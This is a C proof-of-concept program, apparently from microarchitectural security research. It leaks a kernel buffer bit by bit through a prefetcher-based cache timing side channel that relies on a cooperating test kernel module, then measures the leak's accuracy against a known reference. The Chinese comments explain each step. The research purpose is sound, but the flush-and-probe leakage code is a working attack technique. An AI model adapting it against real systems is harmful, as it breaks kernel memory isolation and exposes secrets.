#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <time.h>

#include "common.h"

// 文件描述符，用于与内核模块通信
static int module_fd;

// 指向加载（load）指令的函数指针，这个指令将是侧信道攻击的目标，因为它在用户空间和内核空间之间共享。
static load_gadget_f gadget;

// 用于缓存冲突的缓冲区，它与内核模块中的某个缓冲区映射到相同的物理内存页，但处于不同的虚拟地址空间。
static uint8_t* colliding_buffer;

// 用于区分缓存命中和缓存未命中的时间阈值
static uint64_t threshold;

// 尝试“猜测”一个比特的函数
uint64_t guess_byte(size_t stride, size_t offset, size_t guess_offset) {
    // 刷新上次访问的缓冲区位置和探测位置，确保它们不在缓存中。
    // 这里引入了 guess_offset，表示在探测时，colliding_buffer会偏移一个额外的量。
    // 这允许同时探测两个不同的缓存行，一个用于“原始”猜测，一个用于“反转”猜测。
    flush(colliding_buffer + 2 * stride + guess_offset); 
    flush(colliding_buffer + 3 * stride + guess_offset); 
    mfence();

    // access in kernel to kernel_buffer[secret[offset]]
    // 通过ioctl调用内核模块，使内核访问其内部的kernel_buffer[secret[offset]]。
    // CMD_GADGET_OFF 表明内核会根据 secret[offset] 的值来决定访问哪个偏移。
    // 举例来说，如果 secret[offset] 是 0，内核访问 kernel_buffer[0]；如果 secret[offset] 是 1，内核访问 kernel_buffer[1]。
    ioctl(module_fd, CMD_GADGET_OFF, offset);
    mfence();
   
    // 在用户空间进行更多的访问。
    // 如果内核因为 secret[offset] 的值而访问了某个内存位置，并且这个位置与 colliding_buffer + guess_offset 相关的缓存行对应，
    // 那么这里对 colliding_buffer + guess_offset 的访问会遵循一定的步幅（stride），并可能触发预取（prefetch）。
    // 这里的 guess_offset 至关重要，它决定了我们正在探测的是哪个“猜测”路径。
    gadget(colliding_buffer + 1 * stride + guess_offset);
    mfence();
    gadget(colliding_buffer + 2 * stride + guess_offset);
    mfence();
    
    // 探测 colliding_buffer + 3 * stride + guess_offset 处的访问时间。
    // fast access time -> was prefetched -> accesses followed stride -> guess was correct
    // 如果访问时间很短（低于阈值），表示被预取（或直接缓存命中），
    // 这意味着内核的访问确实触发了预取链，因此我们的“猜测”是正确的。
    return probe(colliding_buffer + 3 * stride + guess_offset) < threshold;
}

// 获取纳秒级时间的辅助函数
static uint64_t get_time_nanos() {
    struct timespec t;
    clock_gettime(CLOCK_MONOTONIC, &t);
    return t.tv_sec * 1000000000ull + t.tv_nsec;
}

// 泄露单个字节的函数，现在返回一个 uint16_t，其中包含了原始字节和其按位反转的字节的泄露结果
static uint16_t leak_byte(size_t offset) {
    uint8_t byte = 0;   // 用于存储原始字节的泄露结果
    uint8_t byte_inv = 0;   // 用于存储按位反转字节的泄露结果
    for(int bit = 0; bit < 8; bit ++) {
        // 泄露单个比特的“原始”值。guess_offset = 1 可能是指向用于探测“1”值的特定缓存区域。
        byte |= guess_byte((rand64() % 2048) + 512, offset * 8 + bit, 1) << bit;
        // 泄露单个比特的“反转”值。guess_offset = 0 可能是指向用于探测“0”值的特定缓存区域。
        byte_inv |= guess_byte((rand64() % 2048) + 512, offset * 8 + bit, 0) << bit;
    }
    // 将原始泄露结果放在低8位，将反转泄露结果放在高8位，组成一个16位的值返回。
    return (byte_inv << 8) | byte;
}

// 分析泄露结果的函数，计算正确率、误报和漏报
static void analyze_leakage(uint8_t reference, uint8_t observed, uint32_t* correct, uint32_t* false_positives, uint32_t* false_negatives, uint32_t* positives, uint32_t* negatives) {
    for(uint32_t i = 0; i < 8; i++) {
        uint32_t mask = 1 << i;
        // 统计真实的正例和负例
        if(reference & mask){
            *positives += 1;
        } else {
            *negatives += 1;
        }
        // 检查参考值和观察值是否不同
        if((reference ^ observed) & mask) { // 如果两个比特位不相同
            if(observed & mask) {
                // 观察到的是1，但参考是0 -> 误报 (False Positive)
                *false_positives += 1;
            } else {
                // 观察到的是0，但参考是1 -> 漏报 (False Negative)
                *false_negatives += 1;
            }
        } else {
            // 相同 -> 正确
            *correct += 1;
        }
    }
}

int main(int argc, char** argv) {
    // 打开内核模块设备文件
    module_fd = open(FETCHPROBE_MODULE_DEVICE_PATH, O_RDONLY);
    if(module_fd < 0) {
        fputs("failed to open kernel module!\n", stderr);
        return -1;
    }
    
    // 从内核获取必要的信息（如内核缓冲区地址和内核加载指令地址）
    struct fetchprobe_kernel_info info;
    ioctl(module_fd, CMD_INFO, &info);
    // 这里获取的是 kernel_access_off，这与前一个版本中的 kernel_access_cf 不同，
    // 表明内核模块提供了一个根据偏移量访问的gadget。
    printf("kernel buffer: 0x%016zx\nkernel load: 0x%016zx\n", info.kernel_buffer, info.kernel_access_off);
    
    // 映射与内核缓冲区发生冲突的缓冲区。
    // map_gadget将内核的加载指令映射到用户空间可执行的地址。
    gadget = map_gadget(info.kernel_access_off & 0x7fffffffffffull);
    // map_buffer映射一个用户空间缓冲区，其物理地址可能与内核缓冲区重叠。
    // (info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2：根据内核缓冲区地址计算冲突缓冲区的起始地址。
    // PAGE_SIZE * 5：映射的缓冲区大小。
    // + PAGE_SIZE * 2：可能是为了调整到合适的偏移量，使得与内核缓冲区重叠。
    colliding_buffer = map_buffer((info.kernel_buffer & 0x7fffffffffffull) - PAGE_SIZE * 2, PAGE_SIZE * 5) + PAGE_SIZE * 2;
    printf("colliding buffer: 0x%016zx\ncolliding load: 0x%016zx\n", (uintptr_t)colliding_buffer, (uintptr_t)gadget);
    
    // 计算区分缓存命中和未命中的阈值
    threshold = calculate_threshold();
    printf("threshold: %zu\n", threshold);
    
    // 使用时间戳作为随机数生成器的初始种子
    uint64_t shared_seed = _rdtsc();
    
    // 使用伪随机数据初始化内核缓冲区
    ioctl(module_fd, CMD_RESET, shared_seed);
   
    // 泄露整个缓冲区的数据
    uint16_t leakage[BUFFER_SIZE] = {0};    // 用于存储泄露结果的数组，现在每个元素是16位
    mfence();
    uint64_t start = get_time_nanos();  // 开始计时
    mfence();
    for(int offset = 0; offset < BUFFER_SIZE; offset ++) {
        leakage[offset] = leak_byte(offset);    // 逐字节泄露
    }
    mfence();
    uint64_t end = get_time_nanos();    // 结束计时
    mfence();
    printf("time: %zu\n", end - start); // 打印泄露所需时间
    
    // 检查泄露的准确性
    seed = shared_seed; // 重新设置随机数种子，以便生成与内核缓冲区初始化时相同的随机数据作为参考
    uint32_t correct = 0;
    uint32_t false_positives = 0;
    uint32_t false_negatives = 0;
    uint32_t positives = 0;
    uint32_t negatives = 0;

    // 新增用于反转泄露结果的统计变量
    uint32_t inv_correct = 0;
    uint32_t inv_false_positives = 0;
    uint32_t inv_false_negatives = 0;
    uint32_t inv_positives = 0;
    uint32_t inv_negatives = 0;
    
    for(int i = 0; i < BUFFER_SIZE; i++) {
        uint8_t ref = (uint8_t)(rand64() & 255);    // 生成与内核中一致的随机参考数据
        // 分析原始泄露结果
        analyze_leakage(ref, (uint8_t)leakage[i], &correct, &false_positives, &false_negatives, &positives, &negatives);
        // 分析反转泄露结果。参考数据也需要按位反转 (ref ^ 0xff)。
        analyze_leakage(ref ^ 0xff, (uint8_t)(leakage[i] >> 8), &inv_correct, &inv_false_positives, &inv_false_negatives, &inv_positives, &inv_negatives);
    }
    
    printf("correct: %u\n", correct);
    printf("positives: %u\n", positives);
    printf("negatives: %u\n", negatives);
    printf("false positives: %u\n", false_positives);
    printf("false negatives: %u\n", false_negatives);
    
    printf("inv correct: %u\n", inv_correct);
    printf("inv positives: %u\n", inv_positives);
    printf("inv negatives: %u\n", inv_negatives);
    printf("inv false positives: %u\n", inv_false_positives);
    printf("inv false negatives: %u\n", inv_false_negatives);
    // no need to unmap, etc. OS will take care of that for us :)
    // 无需手动解除映射等操作，操作系统会在程序退出时自动处理
}	
